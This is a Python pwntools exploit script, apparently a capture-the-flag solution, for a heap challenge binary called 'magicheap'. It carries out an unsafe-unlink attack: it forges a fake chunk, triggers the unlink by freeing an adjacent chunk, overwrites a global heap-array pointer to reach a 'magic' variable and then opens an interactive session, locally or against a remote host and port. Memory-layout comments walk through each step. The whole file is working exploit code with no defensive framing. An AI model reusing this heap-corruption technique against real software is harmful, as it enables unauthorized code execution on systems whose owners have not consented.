# --==[[ unsafe unlink 

from pwn import *

array    = 0x6020e0
fd       = array - (3*8)
bk       = array - (2*8)
magic    = 0x6020c0

def alloc(size, data):

	r.sendlineafter('choice :', '1')
	r.sendlineafter('Heap : ', str(size))

	if size < len(data):
		data += "\n"
	r.sendafter('heap:', data)

	return

def free(idx):

	r.sendlineafter('choice :', '3')
	r.sendlineafter('Index :', str(idx))

	return

def edit(idx, size, data):

	r.sendlineafter('choice :', '2')
	r.sendlineafter('Index :', str(idx))
	r.sendlineafter('Heap : ', str(size))

	if size < len(data):
		data += "\n"
	r.sendafter('heap : ', data)

	return

def pwn():

	alloc(0x80, 'A'*8) # chunk 0
	alloc(0x80, 'B'*8) # chunk 1
	alloc(0x80, 'C'*8) # chunk 2

	fake_chunk  = p64(0)
	fake_chunk += p64(0x8)
	fake_chunk += p64(fd)
	fake_chunk += p64(bk)
	fake_chunk += 'A'*0x60
	fake_chunk += p64(0x80)
	fake_chunk += p8(0x90)

	edit(0, len(fake_chunk), fake_chunk)

	##########################################################################
	#
	#	0x603000:	0x0000000000000000	0x0000000000000091 <-- chunk 0
	#	0x603010:	0x0000000000000000	0x0000000000000008 <-- fake chunk inside chunk 0
	#	0x603020:	0x00000000006020c8	0x00000000006020d0 <-- fake fd / bk
	#	0x603030:	0x4141414141414141	0x4141414141414141
	#	0x603040:	0x4141414141414141	0x4141414141414141
	#	0x603050:	0x4141414141414141	0x4141414141414141
	#	0x603060:	0x4141414141414141	0x4141414141414141
	#	0x603070:	0x4141414141414141	0x4141414141414141
	#	0x603080:	0x4141414141414141	0x4141414141414141
	#	0x603090:	0x0000000000000080	0x0000000000000090 <-- chunk 1 [to be free'd]
	#	0x6030a0:	0x4242424242424242	0x0000000000000000
	#
	##########################################################################

	# unlink chunk 0 and chunk 1
	free(1)

	payload  = p64(0)*3
	payload += p64(magic)

	edit(0, len(payload), payload)

	##########################################################################
	#
	#	0x6020e0 <heaparray>:		0x00000000006020c0	0x0000000000000000
	#	0x6020f0 <heaparray+16>:	0x0000000000603130	0x0000000000000000
	#
	##########################################################################

	edit(0, 8, p64(0x1306))

	r.sendline(str(0x1305))

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./magicheap')
        pause()
        pwn()
